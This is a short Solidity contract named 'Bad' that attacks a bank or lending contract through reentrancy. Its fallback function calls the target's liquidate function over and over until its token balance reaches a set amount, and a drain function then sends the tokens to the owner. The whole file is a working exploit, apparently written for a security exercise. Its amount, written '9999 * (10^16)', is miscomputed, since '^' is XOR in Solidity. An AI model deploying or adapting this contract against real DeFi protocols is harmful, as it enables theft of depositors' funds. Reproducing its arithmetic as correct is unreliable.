pragma solidity 0.7.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./interfaces/IBank.sol";

contract Bad {
    address public owner;
    address hak_address;
    address addr2;
    IBank target;
    ERC20 token;

    constructor(address _token, address _target, address _addr2) public {
        owner = msg.sender;
        hak_address = _token;
        token = ERC20(_token);
        target = IBank(_target);
        addr2 = _addr2;
    }

    function drain() public {
        if (msg.sender == owner) {
            token.transfer(owner, 9999 * (10^16));
        }
    }

    function call_liquidate() public {
        target.liquidate(hak_address, addr2);
    }

    fallback() external payable {
        while (token.balanceOf(address(this)) < 9999 * (10^16)) {
            call_liquidate();
        }
    }
}